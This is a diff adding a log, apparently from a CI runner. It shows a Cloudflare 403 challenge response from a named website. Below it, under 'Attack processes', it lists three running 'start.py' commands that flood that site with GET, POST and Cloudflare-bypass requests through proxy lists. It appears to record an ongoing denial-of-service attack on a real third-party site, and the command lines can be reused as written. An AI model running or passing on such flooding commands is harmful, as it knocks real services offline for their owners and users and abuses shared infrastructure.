@@ -1,0 +1,16 @@
+=== VERIFIKASI 30d ===
+HTTP/2 403 
+date: Sat, 24 Oct 2026 08:16:55 GMT
+content-type: text/html; charset=UTF-8
+content-length: 5249
+accept-ch: Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA
+cf-mitigated: challenge
+content-security-policy: default-src 'none'; script-src 'nonce-7VFkX99N6db3bSw86PphXT' 'unsafe-eval' https://challenges.cloudflare.com; script-src-attr 'none'; style-src 'unsafe-inline'; img-src 'self' https://challenges.cloudflare.com; connect-src 'self' https://challenges.cloudflare.com; frame-src 'self' https://challenges.cloudflare.com blob:; child-src 'self' https://challenges.cloudflare.com blob:; worker-src blob:; form-action http: https:; base-uri 'self'
+server: cloudflare
+critical-ch: Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA
+cross-origin-embedder-policy: require-corp
+
+=== Attack processes ===
+runner     72058  6.9  2.5 10644904 424328 ?     Sl   08:14   0:11 python3 start.py GET https://www.nadiavpn.web.id/ 5 500 /tmp/proxy_lists/final_socks5.txt 100 180
+runner     72605 14.9  2.6 10646068 426704 ?     Sl   08:15   0:16 python3 start.py POST https://www.nadiavpn.web.id/ 5 500 /tmp/proxy_lists/final_socks5.txt 100 180
+runner     74282  9.7  0.9 10365696 153376 ?     Sl   08:16   0:03 python3 start.py CFBUAM https://www.nadiavpn.web.id/ 1 500 /tmp/proxy_lists/final_http.txt 100 180
